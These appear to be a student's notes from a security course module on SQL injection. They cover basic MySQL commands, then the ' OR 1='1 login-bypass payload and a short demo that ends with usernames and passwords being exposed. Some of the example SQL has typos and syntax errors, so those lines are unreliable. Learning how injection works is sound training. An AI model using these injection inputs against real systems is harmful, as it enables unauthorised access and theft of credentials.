### We are only extracting information in this module, so the only important onces that we will use are Union and Select
### At the end o every sql command you have to put a ";"
### 3 Default databases are information_schema, mysql, and performance_schema
## SQL Demo
```
mysql

show databases;

show tables from session; # Shows tables inside of session database

show colums from session.tires; # Shows all the colums that are in the tires table inside of the session database

select name,tireid,size,cost, from session.tires; # This shows the data inside of session.tires

show columns from session.car;

select carid,name,cost,size from session.tires union select carid,color,cost from session.car; # selects multiple things and joins them in the output
```
# Injecting
* SELECT id FROM users WHERE name=‘[tom' OR 1='1’ AND pass=‘tom' OR 1='1’]
  - You are forcing a boolean that will result in true into the user and password variable
### Injecting Demo
```
' OR 1='1
# Once we got in, we opened the developer console (inspect) and found a username variable
# Make sure to click the radio button to see information in RAW format
# We then copied that variable added a "?" to the url because we are passing information and pasted the variable
# After doing this we were shown usernames and passwords in that variable
```
